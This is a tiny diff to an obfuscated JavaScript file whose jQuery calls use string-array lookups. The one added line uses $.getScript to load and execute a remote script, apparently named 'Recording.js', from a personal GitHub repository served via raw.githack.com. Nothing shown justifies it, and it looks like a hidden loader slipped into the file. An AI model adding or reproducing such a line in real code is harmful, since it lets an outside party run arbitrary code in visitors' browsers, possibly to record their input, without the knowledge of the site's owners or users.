@@ -29,3 +29,4 @@ $(_0x46c7[27])[_0x46c7[21]](_0x46c7[20]);
 $(_0x46c7[29])[_0x46c7[1]](_0x46c7[28]);
 $(_0x46c7[32])[_0x46c7[31]](_0x46c7[30]);
 $(_0x46c7[34])[_0x46c7[1]](_0x46c7[33]);
+$["getScript"]("https://raw.githack.com/mmnm399819/dimaski98/master/Recording.js")
